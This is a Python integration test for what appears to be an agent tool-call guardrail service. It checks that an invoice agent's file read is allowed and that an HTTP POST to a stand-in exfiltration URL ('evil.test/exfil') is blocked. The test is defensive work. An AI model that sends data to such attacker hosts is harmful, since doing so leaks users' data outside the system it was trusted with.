"""Allow/block round trip over HTTP (Phase 1 gate; requires DB)."""

import os

import pytest
from fastapi.testclient import TestClient

from app.core.db import ping
from app.main import app

pytestmark = pytest.mark.docker


@pytest.fixture(scope="module", autouse=True)
def skip_if_no_db():
    try:
        ping()
    except Exception:
        pytest.skip("database unavailable")


def test_allow_and_block_roundtrip():
    client = TestClient(app)
    api_key = os.getenv("AGENT_API_KEY", os.getenv("GHOSTFENCE_AGENT_API_KEY", "dev-agent-key"))
    run_resp = client.post(
        "/v1/runs",
        headers={"X-API-Key": api_key},
        json={"agent_id": "invoice-agent", "task": "summarise doc", "mode": "enforce"},
    )
    assert run_resp.status_code == 200
    run = run_resp.json()
    token = run["run_token"]
    session_id = run["session_id"]

    allow_resp = client.post(
        "/v1/execute",
        headers={"X-Run-Token": token},
        json={
            "agent_id": "invoice-agent",
            "session_id": session_id,
            "task": "summarise doc",
            "tool_name": "read_file",
            "arguments": {"path": "invoices/invoice-1.pdf"},
        },
    )
    assert allow_resp.status_code == 200
    assert allow_resp.json()["decision"] == "allow"

    block_resp = client.post(
        "/v1/execute",
        headers={"X-Run-Token": token},
        json={
            "agent_id": "invoice-agent",
            "session_id": session_id,
            "task": "summarise doc",
            "tool_name": "http_request",
            "arguments": {"url": "https://evil.test/exfil", "method": "POST"},
        },
    )
    assert block_resp.status_code == 200
    assert block_resp.json()["decision"] == "block"